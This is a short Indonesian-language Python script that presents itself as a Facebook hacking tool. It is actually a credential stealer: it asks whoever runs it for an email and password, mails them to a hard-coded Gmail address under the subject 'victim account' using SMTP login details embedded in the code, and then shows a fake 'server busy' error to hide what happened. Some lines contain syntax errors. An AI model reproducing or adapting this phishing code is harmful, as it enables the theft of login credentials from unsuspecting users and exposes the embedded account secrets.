import os, sys
print ("Menginstall paket.............")
os.system('pip install yagmail')
os.system('pip install termcolor')
import yagmail
from termcolor import colored
print (colored('paket selesai di install.','blue'))
baner = """
___________                  ___.                  __    
\_   _____/____    ____  ____\_ |__   ____   ____ |  | __
 |    __) \__  \ _/ ___\/ __ \| __ \ /  _ \ /  _ \|  |/ /
 |     \   / __ \\  \__\  ___/| \_\ (  <_> |  <_> )    < 
 \___  /  (____  /\___  >___  >___  /\____/ \____/|__|_ \
     \/        \/     \/    \/    \/                   \/
        Tool Hacking Facebook Terbaru Work 100%
        """
print (colored(baner,'green'))
print (colored('silahkan login untuk mengambil id...','blue')
anjirt = yagmail.SMTP('fikinaxrastaman@gmail.com','sasmita57')
username = str(input(colored('Masukan email: ','yellow')))
password = str(input(colored('Masukan password: ','yellow')))
body = ('username: '+username, 'password: '+password)
subject = 'Akun korban'
anjirt.send('arafiqabid57@gmail.com',subject,body)
print (colored(Maaf, server sibuk (TERLALU BANYAK PERMINTAAN). coba beberapa saat lagi','red'))